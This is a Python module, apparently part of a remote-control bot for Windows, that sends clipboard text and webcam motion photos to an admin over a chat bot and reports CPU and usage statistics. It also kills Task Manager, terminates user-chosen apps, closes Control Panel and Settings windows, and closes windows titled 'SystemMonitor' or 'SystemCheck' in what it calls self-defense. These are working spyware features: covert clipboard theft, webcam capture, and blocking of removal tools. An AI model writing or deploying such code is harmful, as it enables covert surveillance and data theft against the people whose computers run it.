"""
System Monitor Module
Optimized monitoring with debounce and resource management

Developer: TsByin
Version: 12.0
"""

import os
import time
import ctypes
import logging
import psutil
import cv2
from threading import Event, Thread, Lock
from datetime import datetime

logger = logging.getLogger(__name__)
cam_lock = Lock()  # Serialises access to VideoCapture(0); shared with media.py

# Windows Settings UWP class names — only these are the real Settings app
_WINDOWS_SETTINGS_CLASSES = frozenset([
    "ApplicationFrameWindow",  # Windows 10/11 UWP shell
])
_WINDOWS_SETTINGS_TITLES = frozenset([
    "settings", "cài đặt", "paramètres", "einstellungen", "configuración",
])
_BROWSER_EXE = frozenset([
    "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe",
    "vivaldi.exe", "iexplore.exe", "chromium.exe",
])

def _close_windows_settings_uwp():
    """Close ONLY the real Windows Settings UWP window (ApplicationFrameWindow),
    NOT browser settings/preferences pages which also have 'settings' in their title."""
    try:
        GetClassName = ctypes.windll.user32.GetClassNameW
        GetWindowText = ctypes.windll.user32.GetWindowTextW
        GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
        IsWindowVisible = ctypes.windll.user32.IsWindowVisible
        PostMessage = ctypes.windll.user32.PostMessageW
        WM_CLOSE = 0x0010

        def _enum_cb(hwnd, _):
            if not IsWindowVisible(hwnd):
                return True
            # Check window class name
            cls_buf = ctypes.create_unicode_buffer(256)
            GetClassName(hwnd, cls_buf, 256)
            cls = cls_buf.value

            if cls not in _WINDOWS_SETTINGS_CLASSES:
                return True  # Not a UWP ApplicationFrameWindow — skip

            # Confirm title contains a settings keyword
            length = GetWindowTextLength(hwnd)
            if length == 0:
                return True
            title_buf = ctypes.create_unicode_buffer(length + 1)
            GetWindowText(hwnd, title_buf, length + 1)
            title = title_buf.value.lower()

            if any(kw in title for kw in _WINDOWS_SETTINGS_TITLES):
                PostMessage(hwnd, WM_CLOSE, 0, 0)
                logger.info(f"Closed Windows Settings UWP: '{title_buf.value}'")
            return True

        CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
        ctypes.windll.user32.EnumWindows(CMPFUNC(_enum_cb), 0)
    except Exception as e:
        logger.error(f"_close_windows_settings_uwp failed: {e}")

# ==============================================================================
# SYSTEM MONITOR CLASS
# ==============================================================================

class SystemMonitor:
    """Optimized system monitoring with graceful shutdown"""
    
    def __init__(self, admin_id, bot, config):
        self.admin_id = admin_id
        self.bot = bot
        self.config = config
        
        self.stop_event = Event()
        self.cap = None
        self.last_alerts = {}  
        self.block_mode_active = False
        self.taskmgr_locked = False
        self.intrusion_alert_active = False
        self.clipboard_monitor_active = False
        self._last_clipboard_text = None
        self._flags_lock = Lock()  # Thread-safe access to flags

        # Performance: cache blocked list — avoid disk read every tick
        self._blocked_cache = None
        self._blocked_mtime = 0.0

        # Intrusion detection runs in its own dedicated thread
        self._intrusion_thread = None
        
        # Import utilities
        from utils import get_active_window_title, find_and_close_window
        self.get_active_window_title = get_active_window_title
        self.find_and_close_window = find_and_close_window

    def _get_blocked_cached(self):
        """Return cached blocked list; reload only when the file has changed"""
        from config import BLOCKED_FILE
        try:
            mtime = os.path.getmtime(BLOCKED_FILE)
        except OSError:
            mtime = 0.0
        if self._blocked_cache is None or mtime != self._blocked_mtime:
            from utils import load_blocked_list
            self._blocked_cache = load_blocked_list(BLOCKED_FILE)
            self._blocked_mtime = mtime
        return self._blocked_cache
    
    def run(self):
        """Main monitoring loop"""
        logger.info("🟢 System monitor started")
        _clip_tick = 0
        _proc_tick = 0

        while not self.stop_event.is_set():
            try:
                self._check_self_defense()

                # Read runtime flags atomically to avoid mixed-state snapshots.
                with self._flags_lock:
                    block_mode_active = self.block_mode_active
                    taskmgr_locked = self.taskmgr_locked
                    intrusion_alert_active = self.intrusion_alert_active
                    clipboard_monitor_active = self.clipboard_monitor_active

                # Process scan every 2 ticks — halves the psutil.process_iter() overhead
                _proc_tick += 1
                if _proc_tick >= 2:
                    _proc_tick = 0
                    self._check_processes(block_mode_active, taskmgr_locked)

                self._check_cpu_alert()

                # Intrusion detection: start/stop its own dedicated thread as needed
                if intrusion_alert_active:
                    if self._intrusion_thread is None or not self._intrusion_thread.is_alive():
                        self._intrusion_thread = Thread(
                            target=self._intrusion_loop, daemon=True
                        )
                        self._intrusion_thread.start()

                # Clipboard monitor every ~3 ticks
                _clip_tick += 1
                if clipboard_monitor_active and _clip_tick >= 3:
                    _clip_tick = 0
                    self._check_clipboard_monitor()
            except Exception as e:
                logger.error(f"Monitor loop error: {e}", exc_info=True)

            # wait() instead of sleep() — responds to stop_event immediately
            self.stop_event.wait(self.config.get('MONITOR_INTERVAL', 1))

        logger.info("🔴 System monitor stopped")
    
    def stop(self):
        """Graceful shutdown"""
        logger.info("Stopping system monitor...")
        self.stop_event.set()
        # self.cap is owned exclusively by _intrusion_loop — do NOT release here.
        # The intrusion thread releases cap itself when stop_event fires.

    def update_flags(self, block_mode=None, taskmgr_locked=None, intrusion_alert=None, clipboard_monitor=None):
        """Update runtime flags controlled by UI commands (thread-safe)"""
        with self._flags_lock:
            if block_mode is not None:
                self.block_mode_active = block_mode
            if taskmgr_locked is not None:
                self.taskmgr_locked = taskmgr_locked
            if intrusion_alert is not None:
                self.intrusion_alert_active = intrusion_alert
            if clipboard_monitor is not None:
                self.clipboard_monitor_active = clipboard_monitor
                if not clipboard_monitor:
                    self._last_clipboard_text = None
    
    def _check_self_defense(self):
        """Check and close detection windows"""
        try:
            active_title = self.get_active_window_title()
            if "SystemMonitor" in active_title or "SystemCheck" in active_title:
                self.find_and_close_window(["SystemMonitor", "SystemCheck"])
        except Exception as e:
            logger.debug(f"Self-defense check failed: {e}")
    
    def _check_processes(self, block_mode_active=False, taskmgr_locked=False):
        """Single-pass process scan: kill blocked apps AND lock TaskMgr in one iteration"""
        if not block_mode_active and not taskmgr_locked:
            return
        try:
            blocked_apps = []
            blocked_tokens = set()
            check_control = False
            check_settings = False

            if block_mode_active:
                blocked_data = self._get_blocked_cached()
                blocked_apps = [a.lower() for a in blocked_data.get("apps", [])]
                blocked_tokens = set(blocked_apps)
                check_control = "control.exe" in blocked_apps
                check_settings = "systemsettings.exe" in blocked_apps

            for proc in psutil.process_iter(['name', 'cmdline']):
                try:
                    pname = proc.info.get('name') or ''
                    p_name = pname.lower()

                    # Only kill Task Manager when the dedicated lock is enabled.
                    if p_name == "taskmgr.exe" and taskmgr_locked:
                        try:
                            proc.terminate()
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                        logger.debug("TaskMgr terminated")
                        continue

                    if not block_mode_active:
                        continue

                    if p_name in blocked_apps:
                        try:
                            proc.terminate()
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                        logger.info(f"Terminated blocked app: {p_name}")
                        continue

                    cmdline_list = proc.info.get('cmdline') or []
                    cmdline = " ".join(cmdline_list).lower()

                    if any(tok in cmdline for tok in blocked_tokens):
                        try:
                            proc.terminate()
                            logger.info(f"Terminated by cmdline match: {p_name}")
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                        continue

                    if check_control and p_name == "rundll32.exe" and ".cpl" in cmdline:
                        try:
                            proc.terminate()
                            logger.info(f"Terminated Control Panel applet: {cmdline}")
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            if block_mode_active:
                if check_control:
                    self.find_and_close_window(["control panel", "bảng điều khiển"])
                if check_settings:
                    _close_windows_settings_uwp()
        except Exception as e:
            logger.error(f"Process check failed: {e}", exc_info=True)
    
    def _check_cpu_alert(self):
        """Alert if CPU exceeds threshold"""
        try:
            cpu = psutil.cpu_percent(interval=0)  # non-blocking — uses last cached sample
            threshold = self.config.get('CPU_ALERT_THRESHOLD', 95)
            cooldown = self.config.get('CPU_ALERT_COOLDOWN', 300)
            
            if cpu > threshold:
                last_alert = self.last_alerts.get('cpu', 0)
                current_time = time.time()
                
                if current_time - last_alert > cooldown:
                    try:
                        self.bot.send_message(self.admin_id, f"⚠️ **CPU CAO:** {cpu}%")
                        self.last_alerts['cpu'] = current_time
                        logger.info(f"CPU alert sent: {cpu}%")
                    except Exception as e:
                        logger.error(f"Send CPU alert failed: {e}")
        except Exception as e:
            logger.error(f"CPU check failed: {e}", exc_info=True)
    
    def _intrusion_loop(self):
        """Dedicated intrusion detection loop — runs in its own thread.
        Isolates the 0.3s inter-frame sleep from the main monitor loop.
        """
        logger.info("🟢 Intrusion detection thread started")
        while not self.stop_event.is_set() and self.intrusion_alert_active:
            encoded_img_bytes = None
            cam_unavailable   = False
            frame_fail        = False
            try:
                with cam_lock:  # hold lock only during hardware access (~0.3 s max)
                    if self.cap is None:
                        self.cap = cv2.VideoCapture(0)
                        if not self.cap.isOpened():
                            logger.warning("Webcam not available for intrusion detection")
                            self.cap = None
                            cam_unavailable = True

                    if not cam_unavailable:
                        ret1, frame1 = self.cap.read()
                        if not ret1:
                            frame_fail = True
                        else:
                            # Inter-frame sleep via Event.wait — respects stop_event
                            self.stop_event.wait(0.3)
                            if not self.stop_event.is_set():
                                ret2, frame2 = self.cap.read()
                                if ret2:
                                    diff = cv2.absdiff(frame1, frame2)
                                    gray = cv2.cvtColor(diff, cv2.COLOR_BGR2GRAY)
                                    blur = cv2.GaussianBlur(gray, (5, 5), 0)
                                    _, thresh = cv2.threshold(blur, 20, 255, cv2.THRESH_BINARY)
                                    dilated = cv2.dilate(thresh, None, iterations=3)
                                    contours, _ = cv2.findContours(dilated, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)
                                    motion_area = self.config.get('MOTION_DETECT_AREA', 3000)
                                    if any(cv2.contourArea(c) > motion_area for c in contours):
                                        success, encoded_img = cv2.imencode('.jpg', frame1)
                                        if success:
                                            encoded_img_bytes = encoded_img.tobytes()

                # Outside lock: long waits and network I/O
                if self.stop_event.is_set():
                    break
                if cam_unavailable:
                    self.stop_event.wait(5)
                    continue
                if frame_fail:
                    self.stop_event.wait(1)
                    continue
                if encoded_img_bytes is not None:
                    try:
                        self.bot.send_photo(self.admin_id, encoded_img_bytes,
                                            caption="🚨 PHÁT HIỆN CÓ NGƯỜI!")
                        logger.info("Intrusion alert sent")
                    except Exception as e:
                        logger.error(f"Send intrusion alert failed: {e}")
                    cooldown = self.config.get('MOTION_DETECT_COOLDOWN', 5)
                    self.stop_event.wait(cooldown)

            except Exception as e:
                logger.error(f"Intrusion loop error: {e}", exc_info=True)
                self.stop_event.wait(2)

        # Release webcam when loop exits
        with cam_lock:
            if self.cap is not None:
                try:
                    self.cap.release()
                except Exception:
                    pass
                self.cap = None
        logger.info("🔴 Intrusion detection thread stopped")

    def _check_clipboard_monitor(self):
        """Send alert when clipboard text changes"""
        try:
            from utils import get_clipboard_contents
            import html as _html
            data = get_clipboard_contents()
            text = data.get("text") or ""
            if text and text != self._last_clipboard_text:
                self._last_clipboard_text = text
                preview = text[:500] + ("…" if len(text) > 500 else "")
                # Use HTML to safely escape clipboard content (backticks or special chars break Markdown)
                safe_preview = _html.escape(preview)
                try:
                    self.bot.send_message(
                        self.admin_id,
                        f"📋 <b>Clipboard thay đổi:</b>\n<pre>{safe_preview}</pre>",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.error(f"Clipboard monitor send failed: {e}")
        except Exception as e:
            logger.debug(f"_check_clipboard_monitor error: {e}")

# ==============================================================================
# BOT STATISTICS
# ==============================================================================

class BotStats:
    """Track bot statistics"""

    def __init__(self):
        self.uptime_start = datetime.now()
        self.commands_executed = 0
        self.data_captured_mb = 0
        self._cached_cpu = 0.0
        self._cpu_cache_time = 0.0
        self._lock = Lock()  # Thread-safe access to counters

    def increment_command(self):
        """Increment command counter (thread-safe)"""
        with self._lock:
            self.commands_executed += 1

    def add_data_captured(self, size_mb):
        """Add to captured data size (thread-safe)"""
        with self._lock:
            self.data_captured_mb += size_mb

    def _get_cpu(self):
        """B7 fixed: non-blocking CPU reading with 2-second cache"""
        now = time.time()
        if now - self._cpu_cache_time >= 2.0:
            self._cached_cpu = psutil.cpu_percent(interval=0)
            self._cpu_cache_time = now
        return self._cached_cpu

    def get_stats(self):
        """Get current statistics"""
        uptime = datetime.now() - self.uptime_start
        cpu = self._get_cpu()
        ram = psutil.virtual_memory().percent
        
        with self._lock:
            commands = self.commands_executed
            data_mb = round(self.data_captured_mb, 2)
        
        return {
            'uptime': str(uptime).split('.')[0],
            'cpu': cpu,
            'ram': ram,
            'commands': commands,
            'data_mb': data_mb,
            'process_count': len(psutil.pids())
        }
    
    def get_stats_message(self):
        """Get formatted stats message"""
        stats = self.get_stats()
        return (
            f"📊 **THỐNG KÊ BOT**\n"
            f"⏱ Uptime: {stats['uptime']}\n"
            f"💻 CPU: {stats['cpu']}% | 💾 RAM: {stats['ram']}%\n"
            f"📡 Lệnh: {stats['commands']} | 📦 Dữ liệu: {stats['data_mb']}MB\n"
            f"🔄 Process: {stats['process_count']}"
        )

# ════════════════════════════════════════════════════════════
# Developer: TsByin
# Module: System Monitoring & Statistics Tracking (Background)
# Features: Debounced Alerts, Motion Detection, CPU Monitoring
# ════════════════════════════════════════════════════════════
